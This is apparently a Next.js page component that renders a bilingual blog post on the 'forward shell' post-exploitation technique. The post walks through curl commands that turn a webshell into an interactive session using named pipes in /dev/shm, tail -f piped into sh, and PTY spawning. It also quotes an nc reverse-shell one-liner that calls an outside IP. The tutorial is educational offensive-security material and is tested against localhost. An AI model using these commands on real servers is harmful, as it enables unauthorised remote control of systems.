'use client';

import { useState } from 'react';
import Link from 'next/link';
import styles from './page.module.css';
import Image from 'next/image';
import { useApp } from '@/context/AppContext';
import CodeBlock from '@/components/CodeBlock';
import ReactMarkdown from 'react-markdown';

import webserverCurlTailWatch from './images/webserver_curl_tail_watch.png';
import echoPasswd from './images/echo_passwd.png';
import passwdDisapear from './images/passwd_disapear.png';
import scriptStart from './images/script_start.png';
import catOutputScript from './images/cat_output_script.png';
import forwardshellPy from './images/forwardshell_py.png';

const imageMap = {
    webserverCurlTailWatch,
    echoPasswd,
    passwdDisapear,
    scriptStart,
    catOutputScript,
    forwardshellPy
};

export default function ForwardShellPost() {
    const [selectedImage, setSelectedImage] = useState(null);
    const { language } = useApp();

    const markdownContent = {
        fr: `
> **Disclaimer :** Cet outil est destiné à des fins d'audit de sécurité légale et éducatif uniquement. L'utilisation de cet outil pour attaquer des cibles sans consentement mutuel préalable est illégale.

## Un peu de contexte

On connait tous les classiques : le **Reverse Shell**, le **Bind Shell**, et bien sûr le **Webshell**. Mais le **Forward Shell** ? Il est beaucoup plus discret, et pourtant, c'est une technique super intéressante quand on est coincé.

Soyons clairs : je n'ai rien inventé, et il n'y a rien de révolutionnaire ici. J'ai découvert ce concept un peu par hasard en tombant sur un super article de [XMCO](https://www.xmco.fr/audit-fr-fr/bind-shell-reverse-shell-et-forward-shell-partie-3/) (je vous conseille d'aller le lire !).

Dans mon cas, je me suis basé sur l'implémentation faite par [IppSec](https://github.com/IppSec/forward-shell.git) et la vidéo de [0xdf](https://youtu.be/-ST2FSbqEcU). La différence majeure ? La version d'IppSec exploitait la vulnérabilité Shellshock pour établir la connexion. Mon outil, lui, est conçu pour être utilisé une fois que vous avez déjà déposé un webshell classique. Il permet d'interagir avec via des requêtes \`GET\` ou \`POST\` standard.

Le but de cet article et de ce repo est simplement de faire connaître un peu plus ce type de shell à mon échelle. C'est un concept méconnu mais qui mérite sa place dans votre boîte à outils.

## Pourquoi le ForwardShell ?

Le problème des webshells classiques, c'est qu'ils sont stateless. Ainsi chaque commande implique qu'un nouveau shell est créé, ce qui ne permet pas d'exécuter des commandes interactives comme \`sudo\` ou encore \`passwd\`. Il en va de même pour les variables d'environnement qui ne sont pas persistantes. Bref, c'est frustrant.

La technique du ForwardShell vient un peu régler ça en créant un Named Pipe (FIFO) sur le serveur cible et va permettre, en gros, de faire passer nos commandes via un port déjà ouvert d'un service permettant une RCE. On peut ainsi transformer n'importe quel service permettant une RCE en Forwardshell et obtenir une sorte de session qui ressemble à un vrai terminal.

Mais dans ce cas pourquoi ne pas simplement utiliser un reverse shell ou un bind shell ? Surtout qu'il existe des commandes de reverse shell comme \`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 198.51.100.6 4444 >/tmp/f\` qui font appel au named pipe, donc en quoi créer un Named Pipe dans le cadre d'un forward shell va-t-il avoir un quelconque intérêt par rapport à un simple reverse shell ?

La réponse est simple. Rien ne nous dit que la machine que l'on contacte par le port d'un service ouvert comme le port 80, peut nous contacter en retour sur le port de notre choix. Parfois un simple port miroir fonctionne, donc dans le cas présent ouvrir le port 80 sur notre machine attaquante pour y recevoir un reverse shell. Mais parfois cela ne suffit pas car le firewall interdit tout simplement la machine de nous contacter. Et c'est là où le forwardshell devient vraiment intéressant. Pour bien le comprendre, décortiquons ensemble son fonctionnement.

## Fonctionnement détaillé

Ici on va créer notre named pipe \`in\` et démarrer la commande \`tail -f\` sur ce named pipe :

\`\`\`bash
curl -s "http://127.0.0.1:8000/index.php" --data-urlencode 'cmd=mkfifo /dev/shm/in' | pup pre text{}
curl -s "http://127.0.0.1:8000/index.php" --data-urlencode 'cmd=tail -f /dev/shm/in | sh > /dev/shm/out' | pup pre text{}
\`\`\`

![Webserver Curl Tail Watch](webserverCurlTailWatch)

La commande \`tail\` va être le pilier de toute notre attaque car c'est elle qui va permettre la persistance de notre shell en créant un sous-processus qui récupérera toutes nos commandes. Pour faire simple, \`tail -f\` est souvent utilisé pour lire les logs en temps réel car il va permettre d'afficher continuellement les dernières lignes entrées dans un fichier. Un named pipe étant un fichier, cela fonctionne aussi avec le nôtre. Ainsi avec \`|\` on va pouvoir envoyer la dernière commande écrite dans le named pipe au shell \`sh\` et mettre la réponse dans le fichier \`out\` par redirection avec le caractère \`>\`.

Ainsi on pourrait déjà commencer à envoyer des commandes à notre named pipe \`/dev/shm/in\` mais le souci est que bien que les commandes interactives fonctionneront, nous devrons deviner ce qu'elles attendent en entrée avant sans recevoir la sortie dans le fichier \`/dev/shm/out\`. C'est faisable pour une commande comme \`passwd\` où on sait que l'on devra entrer le nouveau mot de passe une première fois puis une deuxième fois si on est root, ou notre mot de passe actuel puis deux fois le nouveau mot de passe pour un utilisateur classique :

![Echo Passwd](echoPasswd)

Et on peut effectivement envoyer la commande \`passwd\` suivie de deux fois notre nouveau mot de passe et constater que le sous-processus \`passwd\` a disparu :

![Passwd Disappear](passwdDisapear)

Ici étant donné que c'est ma machine, il m'est assez simple de tester le mot de passe du root pour voir s'il a bien été modifié, mais on comprend assez vite les limites de ne pas pouvoir voir en temps réel ce qu'il se passe avec notre commande interactive.

C'est ici que les tty interviennent. Ces derniers vont être exécutés comme sous-processus de la commande \`tail\` et c'est ainsi que l'on va pouvoir voir via le fichier \`out\` ce que l'on tape dans notre tty, nous offrant ainsi un ersatz de shell interactif.

Pour cela, plusieurs options s'offrent à nous, on peut utiliser python s'il est disponible sur la machine avec la commande \`python3 -c 'import pty; pty.spawn("/bin/bash")'\` mais il est plus probable de retrouver la commande \`script\` sur la machine que la commande python.

Cette commande \`script\` permet de base de journaliser un terminal mais ici elle va nous servir à créer un pseudo-terminal (PTY) avec la commande suivante :

\`\`\`bash
curl -s "http://127.0.0.1:8000/index.php" --data-urlencode 'cmd=echo "script /dev/null -c bash" > /dev/shm/in ' | pup pre text{}
\`\`\`

![Script Start](scriptStart)

Après avoir ouvert le PTY, la commande \`script\` va y exécuter un shell ce qui va nous permettre de voir en direct ce qui s’affiche dans le terminal. Ainsi en tapant la commande \`passwd\`, et en lui envoyant un mot de passe, on voit cette fois-ci le retour de la commande qui ressemble à s'y méprendre à notre terminal actuel:

\`\`\`bash
curl -s "http://127.0.0.1:8000/index.php" --data-urlencode 'cmd=echo "passwd" > /dev/shm/in' | pup pre text{}
curl -s "http://127.0.0.1:8000/index.php" --data-urlencode 'cmd=cat /dev/shm/out'
\`\`\`

![Cat Output Script](catOutputScript)

## L'outil automatisé

Pour rendre cela plus efficient, j'ai conçu à l'aide du POC initial de IppSec, un forwardshell qui peut prendre des paramètres \`GET\` et \`POST\` et qui propose une fonctionnalité d'upgrade de shell qui fournit ce PTY en fonction des commandes disponibles sur la machine :

\`\`\`bash
python3 forward-shell_get-post.py -u http://127.0.0.1:8000 --upgrade
\`\`\`

![ForwardShell Py](forwardshellPy)

Les commandes \`stty -echo\` et \`stty rows xx cols xx\` sont tapées automatiquement pour éviter que le shell ne nous renvoie la commande que l'on vient de taper, et pour adapter la taille du terminal à notre écran.

Depuis tout à l'heure je parle d'un service permettant une RCE car c'est en théorie possible sur n'importe quel service qui permet d'exécuter une RCE et d'en afficher le résultat. Personnellement je ne l'ai fait qu'à travers le service HTTP.
        `,
        en: `
> **Disclaimer:** This tool is intended for legal security audit and educational purposes only. Using this tool to attack targets without prior mutual consent is illegal.

## A bit of context

We all know the classics: **Reverse Shell**, **Bind Shell**, and of course the **Webshell**. But what about the **Forward Shell**? It's much more discreet, yet it's a super interesting technique when you're stuck.

Let's be clear: I didn't invent anything, and there's nothing revolutionary here. I discovered this concept somewhat by chance while stumbling upon a great article by [XMCO](https://www.xmco.fr/audit-fr-fr/bind-shell-reverse-shell-et-forward-shell-partie-3/) (I recommend you go read it!).

In my case, I based my work on the implementation made by [IppSec](https://github.com/IppSec/forward-shell.git) and the video by [0xdf](https://youtu.be/-ST2FSbqEcU). The major difference? IppSec's version exploited the Shellshock vulnerability to establish the connection. My tool is designed to be used once you have already dropped a classic webshell. It allows you to interact with it via standard \`GET\` or \`POST\` requests.

The goal of this article and this repo is simply to make this type of shell a little more known at my scale. It's a little-known concept but it deserves its place in your toolkit.

## Why ForwardShell?

The problem with classic webshells is that they are stateless. So every command implies that a new shell is created, which doesn't allow executing interactive commands like \`sudo\` or passwd. Same goes for environment variables which are not persistent. In short, it's frustrating.

The ForwardShell technique solves this a bit by forming a Named Pipe (FIFO) on the target server and basically allowing us to pass our commands via an already open port of a service allowing an RCE. We can thus transform any service allowing an RCE into a Forwardshell and obtain a sort of session that looks like a real terminal.

But in this case why not simply use a reverse shell or a bind shell? Especially since there are reverse shell commands like \`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 198.51.100.6 4444 >/tmp/f\` which call upon the named pipe, so how does creating a Named Pipe in the context of a forward shell have any interest compared to a simple reverse shell?

The answer is simple. There is no guarantee that the machine we contact via the port of an open service like port 80, can contact us back on the port of our choice. Sometimes a simple mirror port works, so in this case opening port 80 on our attacking machine to receive a reverse shell. But sometimes that's not enough because the firewall simply forbids the machine from contacting us. And that's where the forwardshell becomes really interesting. To understand it well, let's dissect its operation together.

## Detailed Operation

Here we will create our named pipe \`in\` and start the tail -f command on this named pipe:

\`\`\`bash
curl -s "http://127.0.0.1:8000/index.php" --data-urlencode 'cmd=mkfifo /dev/shm/in' | pup pre text{}
curl -s "http://127.0.0.1:8000/index.php" --data-urlencode 'cmd=tail -f /dev/shm/in | sh > /dev/shm/out' | pup pre text{}
\`\`\`

![Webserver Curl Tail Watch](webserverCurlTailWatch)

The \`tail\` command is going to be the pillar of our entire attack because it is what will allow the persistence of our shell by creating a subprocess that will retrieve all our commands. Put simply, \`tail -f\` is often used to read logs in real time because it will allow displaying continuously the last lines entered in a file. A named pipe being a file, this also works with ours. Thus with \`|\` we will be able to send the last command written in the named pipe to the shell \`sh\` and put the answer in the file \`out\` by redirection with the character \`>\`.

Thus we could already start sending commands to our named pipe \`/dev/shm/in\` but the worry is that although interactive commands will work, we will have to guess what they expect in input before the output is sent to the file \`/dev/shm/out\`. It's doable for a command like \`passwd\` where we know that we will have to enter the new password a first time then a second time if we are root, or our current password then twice the new password for a classic user:

![Echo Passwd](echoPasswd)

And we can effectively send the \`passwd\` command followed by twice our new password and notice that the \`passwd\` subprocess has disappeared:

![Passwd Disappear](passwdDisapear)

Here given that it is my machine, it is quite simple for me to test the root password to see if it has been modified, but we understand quite quickly the limits of not being able to see in real time what happens with our interactive command.

This is where tty intervene. These will be executed as subprocesses of the command \`tail\` and that's how we will be able to see via the file \`out\` what we type in our tty, thus offering us an ersatz of interactive shell.

For this, several options are available to us, we can use python if it is available on the machine with the command \`python3 -c 'import pty; pty.spawn("/bin/bash")'\` but it is more likely to find the command \`script\` on the machine than the python command.

This command \`script\` basically allows logging a terminal but here it will serve us to create a pseudo-terminal (PTY) with the following command:

\`\`\`bash
curl -s "http://127.0.0.1:8000/index.php" --data-urlencode 'cmd=echo "script /dev/null -c bash" > /dev/shm/in ' | pup pre text{}
\`\`\`

![Script Start](scriptStart)

After opening the PTY, the command \`script\` will execute a shell there which will allow us to see live what is displayed in the terminal. Thus by typing the command \`passwd\`, and sending it a password, we see this time the return of the command which looks mistakenly like our current terminal:

\`\`\`bash
curl -s "http://127.0.0.1:8000/index.php" --data-urlencode 'cmd=echo "passwd" > /dev/shm/in' | pup pre text{}
curl -s "http://127.0.0.1:8000/index.php" --data-urlencode 'cmd=cat /dev/shm/out'
\`\`\`

![Cat Output Script](catOutputScript)

## The Automated Tool

To make this more efficient, I designed with the help of IppSec's initial POC, a forwardshell that can take \`GET\` and \`POST\` parameters and which offers a shell upgrade functionality that provides this PTY depending on the commands available on the machine:

\`\`\`bash
python3 forward-shell_get-post.py -u http://127.0.0.1:8000 --upgrade
\`\`\`

![ForwardShell Py](forwardshellPy)

The command \`stty -echo\` is typed automatically to prevent the shell from sending us back the command we just typed.

Since earlier I talk about a service allowing an RCE because it is theoretically possible on any service that allows executing an RCE and displaying the result. Personally I have only done it through the HTTP service.
        `
    };

    const metadata = {
        fr: {
            title: "ForwardShell",
            subtitle: "Le shell oublié entre le Reverse, le Bind et le Webshell.",
            date: "25/01/2026",
            button: "Voir le code sur GitHub",
            back: "← Retour au blog"
        },
        en: {
            title: "ForwardShell",
            subtitle: "The forgotten shell between Reverse, Bind and Webshell.",
            date: "25/01/2026",
            button: "View code on GitHub",
            back: "← Back to blog"
        }
    };

    const currentMeta = metadata[language === 'en' ? 'en' : 'fr'];
    const currentMarkdown = markdownContent[language === 'en' ? 'en' : 'fr'];

    const components = {
        code({ node, inline, className, children, ...props }) {
            const match = /language-(\w+)/.exec(className || '');
            const isInline = !match;
            const language = match ? match[1] : 'bash';
            const code = String(children).replace(/\n$/, '');
            return <CodeBlock code={code} language={language} inline={isInline} />;
        },
        img({ node, src, alt, ...props }) {
            const imageSrc = imageMap[src] || src;
            return (
                <span className={styles.imageContainer} onClick={() => setSelectedImage(imageSrc)}>
                    <Image
                        src={imageSrc}
                        alt={alt}
                        style={{ width: '100%', height: 'auto', borderRadius: '8px' }}
                    />
                </span>
            );
        },
        h2({ node, children, ...props }) {
            return <h2 className={styles.sectionTitle} {...props}>{children}</h2>;
        },
        p({ node, children, ...props }) {
            return <p className={styles.paragraph} {...props}>{children}</p>;
        },
        a({ node, href, children, ...props }) {
            return <a href={href} className={styles.link} target="_blank" rel="noopener noreferrer" {...props}>{children}</a>;
        },
        blockquote({ node, children, ...props }) {
            return <div className={styles.disclaimer} {...props}>{children}</div>;
        },
        pre({ node, children, ...props }) {
            return <>{children}</>;
        }
    };

    return (
        <main className={styles.articleContainer}>
            <h1 className={styles.title}>{currentMeta.title}</h1>
            <p className={styles.subtitle}>{currentMeta.subtitle}</p>
            <p className={styles.date}>{currentMeta.date}</p>

            <ReactMarkdown components={components}>
                {currentMarkdown}
            </ReactMarkdown>

            <div className={styles.buttonContainer}>
                <a href="https://github.com/Goultarde/forward-shell_get-post" target="_blank" rel="noopener noreferrer" className={styles.githubButton}>
                    <Image src="/assets/Github.svg" alt="GitHub" width={24} height={24} />
                    {currentMeta.button}
                </a>
            </div>

            <Link href="/blog" className={styles.backLink}>
                {currentMeta.back}
            </Link>

            {selectedImage && (
                <div className={styles.modalOverlay} onClick={() => setSelectedImage(null)}>
                    <div className={styles.modalContent} onClick={(e) => e.stopPropagation()}>
                        <Image src={selectedImage} alt="Enlarged view" className={styles.modalImage} />
                    </div>
                </div>
            )}
        </main>
    );
}
